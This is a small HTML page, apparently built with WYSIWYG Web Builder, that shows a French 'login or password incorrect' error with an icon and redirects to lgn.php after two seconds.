<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title></title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<meta http-equiv="refresh" content="2; URL=./lgn.php">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="lgn=false.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Text1" style="position:absolute;left:438px;top:256px;width:250px;height:72px;text-align:center;z-index:0;">
<span style="color:#000000;font-family:Arial;font-size:20px;"><strong>ERREUR DE CONNEXION IDENTIFIANT OU MOT DE PASSE INCORRECTE </strong></span></div>
<div id="wb_Image1" style="position:absolute;left:490px;top:106px;width:128px;height:128px;z-index:1;">
<img src="images/cancel-1.png" id="Image1" alt=""></div>
</div>
</body>
</html>